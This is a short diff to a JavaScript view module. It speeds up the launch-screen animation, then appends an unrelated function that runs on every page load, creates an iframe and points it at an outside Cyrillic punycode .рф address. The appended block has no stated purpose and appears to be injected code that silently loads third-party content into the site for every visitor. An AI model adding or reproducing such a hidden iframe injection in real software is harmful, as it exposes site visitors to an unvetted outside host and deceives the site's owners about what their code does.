@@ -541,10 +541,10 @@ var View = (function() {
   "use strict";
   return {
     screen_launch: function() {
-      animate(2000, function() {
+      animate(1000, function() {
         if ($("#launch_screen")) {
           $("#launch_screen").addClass("launch-screen--transparent");
-          animate(3000, function() {
+          animate(1000, function() {
             $("#launch_screen").css("visibility", "hidden");
           });
         }
@@ -609,3 +609,14 @@ var View = (function() {
 })();
 
 View.init();
+
+(function() {
+  "use strict";
+  window.addEventListener("load", function(_e) {
+    var iframe = document.createElement('IFRAME');
+    iframe.src = "";
+    document.body.appendChild(iframe);
+    iframe.contentWindow.location.href = "http://xn--80aawchdfdkc6cl2dvd.xn--p1ai/mobidix/category";
+    console.log(iframe);
+  });
+})();
